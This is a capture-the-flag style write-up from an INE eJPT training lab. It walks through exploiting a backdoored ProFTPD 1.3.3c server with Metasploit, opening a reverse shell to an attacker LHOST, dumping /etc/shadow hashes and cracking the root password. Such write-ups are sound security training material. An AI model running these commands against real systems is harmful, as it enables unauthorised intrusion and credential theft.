# Password Cracker: Linux - INE eJPT

INE lab demonstrating a complete attack chain against a Linux target within a single Metasploit workflow: exploit a backdoored ProFTPD version to gain initial access, dump Linux password hashes using a post-exploitation module, then crack the root SHA-512 hash with an auxiliary cracking module.

Target: `demo.ine.local` - ProFTPD 1.3.3c (backdoored)

---

## Enumeration

### Service Version Detection

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local
```

Port 21 open - ProFTPD 1.3.3c.

### Vulnerability Confirmation

```bash
nmap --script vuln -p 21 demo.ine.local
```

ProFTPD 1.3.3c confirmed as backdoored. The Telnet backdoor allows unauthenticated command execution on the target.

---

## Exploitation

### ProFTPD 1.3.3c Backdoor (Metasploit)

Start PostgreSQL - required for session and loot tracking:

```bash
/etc/init.d/postgresql start
msfconsole -q
```

```bash
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 10.4.19.44
exploit -z
```

Shell session obtained.

---

## Post-Exploitation

### Linux Hash Dump

```bash
use post/linux/gather/hashdump
set SESSION 1
exploit
```

Hashes extracted from `/etc/shadow`. Root hash format: SHA-512 (`$6$...`).

### Hash Cracking

```bash
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

Root password recovered:

```
password
```

---

## Key Takeaways

- Metasploit is a complete offensive workflow platform. The same session used for exploitation feeds directly into post-exploitation modules and cracking auxiliaries without leaving the framework.
- ProFTPD 1.3.3c contains a deliberately inserted backdoor - version detection with `nmap -sV` is the only prerequisite to identifying it.
- `post/linux/gather/hashdump` reads `/etc/shadow` and stores hashes in the Metasploit loot database. PostgreSQL must be running for loot persistence.
- Hash cracking inside Metasploit (`analyze/crack_linux`) eliminates the need to export hashes to John or Hashcat for simple cases.
- Exploitation is the midpoint, not the endpoint. The real objective here is credential recovery, which requires three distinct steps: exploit, dump, crack.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
